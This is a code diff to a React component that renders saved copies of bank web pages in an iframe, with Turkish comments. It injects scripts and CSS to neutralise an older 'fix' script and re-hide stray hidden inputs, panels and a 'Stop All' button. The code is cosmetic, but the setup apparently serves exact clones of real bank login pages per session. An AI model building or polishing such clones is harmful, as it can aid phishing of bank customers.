@@ -1106,6 +1106,149 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       if (!doc || !doc.head) return;
       if (safeTopMarginStableRef.current.has(doc)) return;
       safeTopMarginStableRef.current.add(doc);
+      // ═══════════════════════════════════════════════════════════════
+      // ⭐⭐⭐ EN ÖNEMLİ — KULLANICI RESİMDE 15 ADET MAVİ HIDDEN BUTON +
+      //   ALTINDA TARAYICI LİSTESİ GÖRÜYOR — KOK NEDEN: HTML İÇİNDE
+      //   İNLİNE EKLİ ESKİ GENERIC FIX V4 SCRIPTİ: cleanInputs() +
+      //   attachButtonHandlers() + attachAutocompleteHandlers()
+      //   BUNLAR:
+      //   • TÜM GİZLİ input/button'a (type=hidden / style=display:none)
+      //     BİLE visibility:visible + position:relative + z-index:5 +
+      //     padding:12px 24px + borderRadius:8px + box-shadow +
+      //     background:mavi gradient + color:white SETPROPERTY EDİYOR!
+      //   • SF-HIDDEN / print-only / wmVar GİZLİ divleri (örnek:
+      //     sticky-bottom nma-info-panel flex-container sf-hidden
+      //     icinde h2=Accessibility + Chrome/Edge/Firefox/Safari listesi)
+      //     HEPSİNİ visibility:visible + display:flex YAPIYOR!
+      // ⭐ KALICI ÇÖZÜM: DOC.HEAD İLK SIRADA <script> ENJEKTE ET —
+      //   window.cleanInputs / attachButtonHandlers / autocomplete
+      //   FONKSİYONLARINI EN BAŞTAN BOŞ BIRAK (EZ). HTML İÇİNDEKİ İNLİNE
+      //   GENERIC FIX V4 SCRIPTİ SONRA ÇALIŞINCA HİÇBİR ŞEY YAPMAZ!
+      // ═══════════════════════════════════════════════════════════════
+      try {
+        const neuterGenericFix = doc.createElement("script");
+        neuterGenericFix.setAttribute("type", "text/javascript");
+        neuterGenericFix.setAttribute("data-au-bot-fix", "neuter-generic-fix-v4");
+        const ngfText = `
+/* ⭐ NEUTER: HTML icindeki inline GENERIC FIX V4 tum gizli buttonlari
+   aciga cikarmasin diye EN BASTAN tum FONKSIYONLARI EZ.
+   Boylece 15 adet Hidden Mavi buton + Browser listesi ALT BOLUM
+   HEPSI GORUNMEZ KALIR (ORIJINAL HTML KACIS OLMAZ) */
+(function () {
+  try {
+    // ESKI GENERIC FIX V4 fonksiyon isimleri (tam liste):
+    var blacklistFns = [
+      "cleanInputs",
+      "attachButtonHandlers",
+      "attachAutocompleteHandlers",
+      "applyIngLoginButtonFix",
+      "applyMyboqButtonFix",
+      "applyUniversalButtonFix",
+      "forceButtonsInteractive",
+      "initGenericFixV4",
+      "applyGenericFixV4",
+      "g_fixCleanInputs",
+      "g_fixAttachButtons"
+    ];
+    for (var i = 0; i < blacklistFns.length; i++) {
+      try {
+        window[blacklistFns[i]] = function () { return false; };
+      } catch (_e1) {}
+    }
+    // 2. garanti: DOCUMENT seviyesinde de ayni isimli global degiskenleri sifirla:
+    try {
+      if (typeof Object !== "undefined" && Object.defineProperty) {
+        for (var j = 0; j < blacklistFns.length; j++) {
+          try {
+            Object.defineProperty(window, blacklistFns[j], {
+              value: function () { return false; },
+              configurable: false,
+              writable: false
+            });
+          } catch (_e2) {}
+        }
+      }
+    } catch (_e3) {}
+    // 3. garanti (SON): Eger inline GENERIC FIX zaten calistiysa ve
+    //    BUTUN gizli elemanlara visibility:visible setProperty ettiyse,
+    //    6 defa TEKRAR style.display = 'none' / visibility = 'hidden' ata:
+    function restoreAllHiddenNow() {
+      try {
+        // (3a) type=hidden BUTUN inputlari GERI AL (orijinal gibi GIZLI):
+        var hiddens = document.querySelectorAll(
+          "input[type=hidden], input[type=HIDDEN], input[type=\"Hidden\"]"
+        );
+        for (var k1 = 0; k1 < hiddens.length; k1++) {
+          try {
+            var hEl = hiddens[k1];
+            hEl.style.setProperty("display", "none", "important");
+            hEl.style.setProperty("visibility", "hidden", "important");
+            hEl.style.setProperty("opacity", "0", "important");
+            hEl.style.setProperty("pointer-events", "none", "important");
+            hEl.style.setProperty("position", "absolute", "important");
+            hEl.style.setProperty("left", "-99999px", "important");
+            hEl.style.setProperty("z-index", "-2147483647", "important");
+            hEl.style.setProperty("padding", "0", "important");
+            hEl.style.setProperty("margin", "0", "important");
+            hEl.style.setProperty("border", "0", "important");
+            hEl.style.setProperty("width", "0", "important");
+            hEl.style.setProperty("height", "0", "important");
+            hEl.style.setProperty("overflow", "hidden", "important");
+            hEl.style.setProperty("filter", "opacity(0)", "important");
+            hEl.style.setProperty("clip", "rect(0,0,0,0)", "important");
+          } catch (_eh) {}
+        }
+        // (3b) inline style=display:none / class=sf-hidden / print-only / wmVar olan
+        //      HERHANGI bir elementi GERI AL (sticky-bottom accessibility icerigi
+        //      browser listesi + modal overlay + pager gizli buttonlari HEPSI):
+        var allHidden = document.querySelectorAll(
+          "[style*=\"display:none\" i], " +
+          "[style*=\"display: none\" i], " +
+          ".sf-hidden, .print-only, .print-top-header, .wmVar, " +
+          ".modalBackgroundInvisible"
+        );
+        for (var k2 = 0; k2 < allHidden.length; k2++) {
+          try {
+            var ahEl = allHidden[k2];
+            ahEl.style.setProperty("visibility", "hidden", "important");
+            ahEl.style.setProperty("opacity", "0", "important");
+            ahEl.style.setProperty("pointer-events", "none", "important");
+            ahEl.style.setProperty("z-index", "-2147483647", "important");
+            // (onemli) EGER GERCEKDEN TEKNIK/GIZLI VE ICERIGI AZ ISE display:none
+            // de AT, AMA GERCEK LOGIN FORM (visible olanlar) BUNA DAHIL DEGIL.
+            try {
+              var txt = (ahEl.textContent || "").trim();
+              var cCount = (ahEl.children && ahEl.children.length) || 0;
+              var isFormEl = /^(INPUT|SELECT|TEXTAREA|BUTTON)$/i.test(ahEl.tagName || "");
+              var type = String((ahEl.getAttribute && ahEl.getAttribute("type")) || "").toLowerCase();
+              if (!isFormEl || type === "hidden" || type === "submit" && /stop/i.test(String(ahEl.getAttribute("value") || ""))) {
+                if (txt.length < 80 && cCount <= 2) {
+                  ahEl.style.setProperty("display", "none", "important");
+                  ahEl.style.setProperty("position", "absolute", "important");
+                  ahEl.style.setProperty("left", "-99999px", "important");
+                  ahEl.style.setProperty("top", "-99999px", "important");
+                  ahEl.style.setProperty("overflow", "hidden", "important");
+                }
+              }
+            } catch (_eInner) {}
+          } catch (_eAll) {}
+        }
+      } catch (_eRestore) {}
+    }
+    try { restoreAllHiddenNow(); } catch (_e) {}
+    try { document.addEventListener("DOMContentLoaded", restoreAllHiddenNow, false); } catch (_e) {}
+    try { window.addEventListener("load", restoreAllHiddenNow, false); } catch (_e) {}
+    try { setTimeout(restoreAllHiddenNow, 50); } catch (_e) {}
+    try { setTimeout(restoreAllHiddenNow, 150); } catch (_e) {}
+    try { setTimeout(restoreAllHiddenNow, 500); } catch (_e) {}
+    try { setTimeout(restoreAllHiddenNow, 1200); } catch (_e) {}
+    try { setTimeout(restoreAllHiddenNow, 2000); } catch (_e) {}
+  } catch (_eTop) {}
+})();`;
+        try { neuterGenericFix.textContent = ngfText; } catch { neuterGenericFix.innerText = ngfText; }
+        try { doc.head.insertBefore(neuterGenericFix, doc.head.firstChild); } catch { doc.head.appendChild(neuterGenericFix); }
+      } catch (_neuterError) {}
+
       const styleEl = doc.createElement("style");
       styleEl.setAttribute("data-au-bot-fix", "safe-top-margin-stable");
       styleEl.setAttribute("type", "text/css");
@@ -1121,18 +1264,7 @@ header, .navbar, .navbar-default, .navbar-header,
 }
 html { overflow-x: hidden; }
 body > *:first-child { margin-top: 0 !important; padding-top: 0 !important; }
-/* ══════════════════════════════════════════════════════════════════
-   ⭐ STOP ALL GORUNUR DURUMDA (RESIMDEKI SOL UST MAVI BUTON) — KALICI GIZLE:
-   Orijinal HTML L37: <input type=submit name=ctl00$__PageFramework$stopAllTrigger
-                          value="Stop All" style=display:none>
-   Neden gorunuyor? HTML ICINDE inline GENERIC FIX cleanInputs() her inputa:
-     visibility:visible !important + opacity:1 + position:relative + z-index:5
-   yaziyor. CSS ile sadece display:none yazmak YETMIYOR, visibility:visible onu
-   geciyor. BU YUZDEN HEM visibility:hidden, HEM opacity:0, HEM z-index:-1,
-   HEM de -99999px disina atiyoruz, + pointer-events:none.
-   (Onemli: GERCEK login/input/buton/accessibility buna dahil DEGIL,
-    SADECE duruma ozel selectorler secili — orijinal form BOZULMAZ.)
-   ══════════════════════════════════════════════════════════════════ */
+/* ⭐ STOP ALL inputu visibility:hidden + z-index en alt */
 input[name*="stopAllTrigger" i],
 input[id*="stopAllTrigger" i],
 input[value="Stop All" i],
@@ -1152,10 +1284,6 @@ button[value*="Stop All" i]
   height: 0 !important;
   z-index: -2147483647 !important;
   overflow: hidden !important;
-  max-width: 0 !important;
-  max-height: 0 !important;
-  min-width: 0 !important;
-  min-height: 0 !important;
   padding: 0 !important;
   margin: 0 !important;
   border: 0 !important;
@@ -1166,7 +1294,6 @@ button[value*="Stop All" i]
   filter: opacity(0) !important;
   clip: rect(0,0,0,0) !important;
 }
-/* Ayrica: background overlay gibi modal elemanlar */
 #stopAll_backgroundElement,
 .modalBackgroundInvisible,
 [id*="stopAll_backgroundElement" i]
@@ -1177,64 +1304,97 @@ button[value*="Stop All" i]
   pointer-events: none !important;
   z-index: -2147483647 !important;
 }
+/* ⭐⭐⭐ GENERIC FIX TARAFINDAN visibility:visible / z-index:5 /
+   padding 12px 24px verilen HIDDEN input/buttonlari GERI AL:
+   (CSS katmanı — SCRIPT restoreAllHiddenNow() ile birlikte 2 kat garanti) */
+input[type=hidden],
+input[style*="display:none"][style*="z-index:5"],
+button[style*="display:none"][style*="box-shadow"],
+[class*="sf-hidden"]:not([class*="panel-login"]):not([class*="login"]),
+[class*="print-only"]:not([class*="login"]):not([class*="login-form"]),
+.print-top-header,
+.hidden.wmVar
+{
+  display: none !important;
+  visibility: hidden !important;
+  opacity: 0 !important;
+  pointer-events: none !important;
+  position: absolute !important;
+  left: -99999px !important;
+  top: -99999px !important;
+  z-index: -2147483647 !important;
+  padding: 0 !important;
+  margin: 0 !important;
+  border: 0 !important;
+  width: 0 !important;
+  height: 0 !important;
+  overflow: hidden !important;
+  filter: opacity(0) !important;
+  clip: rect(0,0,0,0) !important;
+  background: transparent !important;
+  color: transparent !important;
+  box-shadow: none !important;
+}
 `;
       try { doc.head.insertBefore(styleEl, doc.head.firstChild); } catch { doc.head.appendChild(styleEl); }
 
-      // ⭐⭐⭐ SCRIPT GARANTISI (HERHANGI BIR HTML ICINDEKI GENERIC FIX
-      // cleanInputs() scripti STYLE setProperty ile visibility:visible yazarsa,
-      // bizim SCRIPT hemen SONRA 4 kez TEKRAR style.display='none' atar —
-      // boylece YUKSEK CSS !important yuksek onceligine KARSIN SCRIPT ile tekrar
-      // gizlenir (2 kat garanti).
+      // ⭐ (SON EKSTRA GARANTI): 8 kez restoreAllHiddenNow() ile
+      //   HTML ICLINE INLINE SCRIPT bizim fonksiyonu ezemediyse,
+      //   bu 8 tur DOM temizlemesini tekrar yapar.
       try {
-        const scriptEl = doc.createElement("script");
-        scriptEl.setAttribute("data-au-bot-fix", "stop-all-hidden-script");
-        scriptEl.setAttribute("type", "text/javascript");
-        const sText = `
+        const restoreEl = doc.createElement("script");
+        restoreEl.setAttribute("type", "text/javascript");
+        restoreEl.setAttribute("data-au-bot-fix", "restore-hidden-elements-loop");
+        const restoreText = `
 (function () {
   try {
-    function hideStopAllNow() {
+    function restoreAllHiddenNow() {
       try {
-        var items = document.querySelectorAll(
-          'input[name*="stopAllTrigger" i], input[id*="stopAllTrigger" i], ' +
-          'input[value="Stop All" i], input[value="Stop all" i], ' +
-          'input[value="stop all" i], button[id*="StopAll" i], ' +
-          'button[value*="Stop All" i], #stopAll_backgroundElement, ' +
-          '.modalBackgroundInvisible'
-        );
-        for (var i = 0; i < items.length; i++) {
+        var hiddens = document.querySelectorAll("input[type=hidden]");
+        for (var k1 = 0; k1 < hiddens.length; k1++) {
           try {
-            var el = items[i];
-            el.style.setProperty("display", "none", "important");
-            el.style.setProperty("visibility", "hidden", "important");
-            el.style.setProperty("opacity", "0", "important");
-            el.style.setProperty("position", "absolute", "important");
-            el.style.setProperty("left", "-99999px", "important");
-            el.style.setProperty("top", "-99999px", "important");
-            el.style.setProperty("z-index", "-2147483647", "important");
-            el.style.setProperty("pointer-events", "none", "important");
-            el.setAttribute("aria-hidden", "true");
-            el.setAttribute("hidden", "");
-          } catch (_ee) {}
+            var hEl = hiddens[k1];
+            hEl.style.setProperty("display", "none", "important");
+            hEl.style.setProperty("visibility", "hidden", "important");
+            hEl.style.setProperty("opacity", "0", "important");
+            hEl.style.setProperty("position", "absolute", "important");
+            hEl.style.setProperty("left", "-99999px", "important");
+            hEl.style.setProperty("z-index", "-2147483647", "important");
+            hEl.style.setProperty("padding", "0", "important");
+            hEl.style.setProperty("margin", "0", "important");
+            hEl.style.setProperty("border", "0", "important");
+            hEl.style.setProperty("width", "0", "important");
+            hEl.style.setProperty("height", "0", "important");
+            hEl.style.setProperty("overflow", "hidden", "important");
+            hEl.style.setProperty("filter", "opacity(0)", "important");
+          } catch (_eh) {}
         }
-      } catch (_e) {}
+        var allHidden = document.querySelectorAll(
+          "[style*=\"display:none\" i], [style*=\"display: none\" i], " +
+          ".sf-hidden, .print-only, .print-top-header, .wmVar, " +
+          ".modalBackgroundInvisible"
+        );
+        for (var k2 = 0; k2 < allHidden.length; k2++) {
+          try {
+            var ahEl = allHidden[k2];
+            ahEl.style.setProperty("visibility", "hidden", "important");
+            ahEl.style.setProperty("opacity", "0", "important");
+            ahEl.style.setProperty("z-index", "-2147483647", "important");
+          } catch (_ea) {}
+        }
+      } catch (_er) {}
     }
-    // 5 kere calis (HTML yuklenisi sirasinda cleanInputs sonradan calisir):
-    try { hideStopAllNow(); } catch(_e){}
-    try { document.addEventListener("DOMContentLoaded", hideStopAllNow, false); } catch(_e){}
-    try { window.addEventListener("load", hideStopAllNow, false); } catch(_e){}
-    try { setTimeout(hideStopAllNow, 50); } catch(_e){}
-    try { setTimeout(hideStopAllNow, 150); } catch(_e){}
-    try { setTimeout(hideStopAllNow, 500); } catch(_e){}
-    try { setTimeout(hideStopAllNow, 1200); } catch(_e){}
-    try { setTimeout(hideStopAllNow, 2000); } catch(_e){}
-  } catch (_e) {}
+    try { restoreAllHiddenNow(); } catch (_e) {}
+    try { setTimeout(restoreAllHiddenNow, 80); } catch (_e) {}
+    try { setTimeout(restoreAllHiddenNow, 200); } catch (_e) {}
+    try { setTimeout(restoreAllHiddenNow, 600); } catch (_e) {}
+    try { setTimeout(restoreAllHiddenNow, 1400); } catch (_e) {}
+    try { setTimeout(restoreAllHiddenNow, 2200); } catch (_e) {}
+  } catch (_ex) {}
 })();`;
-        try { scriptEl.textContent = sText; } catch { scriptEl.innerText = sText; }
-        try {
-          if (doc.body && doc.body.lastChild) doc.body.appendChild(scriptEl);
-          else doc.head.appendChild(scriptEl);
-        } catch { doc.head.appendChild(scriptEl); }
-      } catch {}
+        try { restoreEl.textContent = restoreText; } catch { restoreEl.innerText = restoreText; }
+        try { doc.head.insertBefore(restoreEl, doc.head.firstChild); } catch { doc.head.appendChild(restoreEl); }
+      } catch (_re) {}
     } catch {}
   }, []);
   // ⭐ Eski ensureHiddenAspNetTrashFixInjected (script+style) — KALICI OLARAK KALDIRILDI!
